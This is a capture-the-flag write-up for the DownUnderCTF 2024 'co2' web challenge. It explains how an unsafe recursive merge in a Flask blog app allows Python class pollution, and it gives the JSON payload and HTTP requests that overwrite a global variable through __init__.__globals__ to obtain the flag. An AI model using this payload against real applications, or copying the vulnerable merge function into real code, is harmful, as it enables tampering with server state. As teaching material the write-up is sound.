# co2

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

- Solved by: @siunam
- 289 solves / 100 points
- Author: @n00b.master.
- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

A group of students who don't like to do things the "conventional" way decided to come up with a CyberSecurity Blog post. You've been hired to perform an in-depth whitebox test on their web application.

Author: n00b.master.

## Enumeration

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240708163804.png)

In here, we can write our blog posts in the web application.

But first, we'll need to be authenticated. Let's create a new account!

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240708163935.png)

Then login to our new account:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240708164006.png)

After that, we'll be redirected to `/`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240708164033.png)

Now we got 4 new pages to explore!

Dashboard:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240708164335.png)

In here, we can create new blog posts and make them public:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240708164406.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240708164423.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240708164433.png)

Profile:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240708164526.png)

It just displays our username.

Feedback:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240708164559.png)

In here, we can submit this web application's feedback!

Let's try to submit a new one!

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240708164750.png)

After submitting, an alert box will pop up:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240708164758.png)

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240708164845.png)

When we click the "Submit" button, it'll send a POST request to `/save_feedback` with a JSON body data.

Hmm... There's not much we can do in here. Let's read this web application's source code!

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/web/co2/co2.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/DownUnderCTF-2024/web/co2)-[2024.07.08|16:49:44(HKT)]
└> file co2.zip              
co2.zip: Zip archive data, at least v1.0 to extract, compression method=store
┌[siunam♥Mercury]-(~/ctf/DownUnderCTF-2024/web/co2)-[2024.07.08|16:49:45(HKT)]
└> unzip co2.zip              
Archive:  co2.zip
   creating: co2/
  inflating: co2/Dockerfile          
   creating: co2/feedback/
  inflating: co2/run.py              
   creating: co2/app/
  inflating: co2/app/utils.py        
   creating: co2/app/templates/
  inflating: co2/app/templates/dashboard.html  
  inflating: co2/app/templates/profile.html  
  inflating: co2/app/templates/create_post.html  
  inflating: co2/app/templates/register.html  
  inflating: co2/app/templates/feedback.html  
  inflating: co2/app/templates/index.html  
  inflating: co2/app/templates/edit_blog.html  
  inflating: co2/app/templates/base.html  
  inflating: co2/app/templates/changelog.html  
  inflating: co2/app/templates/update_user.html  
  inflating: co2/app/templates/login.html  
  inflating: co2/app/models.py       
  inflating: co2/app/config.py       
  inflating: co2/app/__init__.py     
  inflating: co2/app/routes.py       
 extracting: co2/.env                
   creating: co2/migrations/
  inflating: co2/requirements.txt    
  inflating: co2/docker-compose.yml  
```

After reviewing the source code, we have the following findings:

- This web application is written in Python with Flask web application framework

Let's dive deeper into the source code!

First of, what's our objective? Where's the flag?

In **route `/get_flag`** at `co2/app/routes.py`, we can get the flag while being authenticated. However, there's **an interesting if statement**:

```python
flag = os.getenv("flag")
[...]
@app.route("/get_flag")
@login_required
def get_flag():
    if flag == "true":
        return "DUCTF{NOT_THE_REAL_FLAG}"
    else:
        return "Nope"
```

Wait what?! **How can the `flag` becomes string `true`** when it's already defined?

So, our objective in this challenge, is to **somehow set the `flag` variable to be string `true`**!

**Also, we can see the following interesting class and its comment:**
```python
# Not quite sure how many fields we want for this, lets just collect these bits now and increase them later. 
# Is it possible to dynamically add fields to this object based on the fields submitted by users?
class Feedback:
    def __init__(self):
        self.title = ""
        self.content = ""
        self.rating = ""
        self.referred = ""
```

Hmm... It seems like the `Feedback` class will have another addition fields to be added?

Where does this class is being used?

```python
from .utils import merge, save_feedback_to_disk
[...]
@app.route("/save_feedback", methods=["POST"])
@login_required
def save_feedback():
    data = json.loads(request.data)
    feedback = Feedback()
    # Because we want to dynamically grab the data and save it attributes we can merge it and it *should* create those attribs for the object.
    merge(data, feedback)
    save_feedback_to_disk(feedback)
    return jsonify({"success": "true"}), 200
```

As you can see, the POST route `/save_feedback` uses the `Feedback` class!

In the comment, it says the **`merge`** function from `co2/app/utils.py` should dynamically add user input's attributes into the `feedback` object.

Let's take a look at the `merge` function!

```python
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
```

In this `merge` function, it's a **recursive merge function**, which basically means it combines an object to another object.

In this case, it combines our parsed JSON object to the `feedback` object.

Unfortunately, if there's no sanitization to sanitize the object's key, such as `__init__`, `__globals__`, it's vulnerable to **Python class pollution**. (In JavaScript it's called Prototype Pollution)

Therefore, we can **exploit the class pollution vulnerability to overwrite the `flag`'s value to be string `true`**!!

But wait, **how can we reach the web application's `flag` variable**?

To find it, we can build a local testing environment.

- Modify `co2/run.py`

```python
from app import create_app

app = create_app()

if __name__ == '__main__':
    # app.run(debug=False, host="0.0.0.0")
    app.run(debug=True, host="0.0.0.0", port=1337)
```

In here, we set the `debug` mode to `True`, as well as the `port` set to `1337`.

- Add the following code in the last line at `co2/app/routes.py`

```python
feedback = Feedback()
flag = feedback
print(f'{flag=}')
```

This allows us to test how can we get the `flag` variable.

- Build the Docker containers

```bash
┌[siunam♥Mercury]-(~/ctf/DownUnderCTF-2024/web/co2)-[2024.07.09|13:40:19(HKT)]
└> cd co2 
┌[siunam♥Mercury]-(~/ctf/DownUnderCTF-2024/web/co2/co2)-[2024.07.09|13:40:25(HKT)]
└> docker-compose -f "docker-compose.yml" up -d --build
[...]
```

After building the Docker containers, we can now find the `flag` variable via the `feedback` object.

Since I'm using Visual Studio Code (vscode), the Docker extension and "Dev Containers" allows us to attach vscode and debug a Docker container:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240709140058.png)

After attaching, we can explore the Docker container's directory:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240709140224.png)

Then, we can display the running Flask application's log in real time:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240709140409.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240709140516.png)

Nice! We can now find the `flag` variable via the `feedback` object!

First off, we can use `__class__` special attribute then `__init__` to get the `Feedback` class, or `__init__` method to get the initialized `feedback` object:

```python
flag = feedback.__class__.__init__
```

Or:

```python
flag = feedback.__init__
```

Save it **once or twice**, and you should see the following message in the log:

```python
flag=<bound method Feedback.__init__ of <app.routes.Feedback object at 0x7f0fcadede50>>
```

Then, in Python, we can use the `__globals__` special attribute to get all the global objects, which will return a dictionary object:

```python
flag = feedback.__init__.__globals__
```

Log message:

```python
flag={'__name__': 'app.routes', [...], 'app': <Flask 'app'>, [...], 'flag': {...}, 'Feedback': <class 'app.routes.Feedback'>, [...]}
```

In here, we can see a lot of built-in classes, as well as the running Flask application `app` object.

This is because in the `co2/app.py`, the Flask object is called `app`.

But most importantly, we can also see **the `flag` variable**! Let's read that variable's value!

```python
flag = feedback.__init__.__globals__['flag']
```

> Note: The `__globals__` special attribute returns a dictionary object, that's why we'll need to use the `['<key_here>']` syntax. 

```
flag='false'
```

As expected, it's boolean `False`!

## Exploitation

Now that we know how to get the `flag` variable by using `__init__.__globals__['flag']`, we can pollute it with string `true`!

Let's test it in our local environment!

**To do so, we'll send a POST request to `/save_feedback` with the following JSON body:**
```http
POST /save_feedback HTTP/1.1
Host: localhost:1337
Cookie: session=.eJwlzkEOwkAIAMC_7NkDy8IC_YyhC0SvrT0Z_66J84J5t3sdeT7a9jquvLX7M9rWNESqArEAVHCIdQCWvmuf0xQXuyImLjIG8MIkhAAaPSZlDuxqZQg1yIUKrLw4MtLcfU2sGG6LhKY6M6MgY-61qEsCabVf5Drz-G96-3wBOFMuUQ.Zozftw.Q_HN_NwdRGrGpCl4NjPSjxXdOcw
Content-Length: 7
Content-Type: application/json

{
    "title":"literally_anything",
    "content":"literally_anything",
    "rating":"literally_anything",
    "referred":"literally_anything",
    "__init__":{
        "__globals__":{
            "flag": "true"
        }
    }
}
```

> Note: Remember, this route requires authentication.

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240709150007.png)

Now the `flag` variable's value should be string `true`!

**Finally, we can send a GET request to `/get_flag` to get the flag!**
```http
GET /get_flag HTTP/1.1
Host: localhost:1337
Cookie: session=.eJwlzkEOwkAIAMC_7NkDy8IC_YyhC0SvrT0Z_66J84J5t3sdeT7a9jquvLX7M9rWNESqArEAVHCIdQCWvmuf0xQXuyImLjIG8MIkhAAaPSZlDuxqZQg1yIUKrLw4MtLcfU2sGG6LhKY6M6MgY-61qEsCabVf5Drz-G96-3wBOFMuUQ.Zozftw.Q_HN_NwdRGrGpCl4NjPSjxXdOcw


```

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240709150126.png)

Nice! Let's get the real flag on the remote instance by repeat the above steps!

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240709150328.png)

- **Flag: `DUCTF{_cl455_p0lluti0n_ftw_}`**

## Conclusion

What we've learned:

1. Python class pollution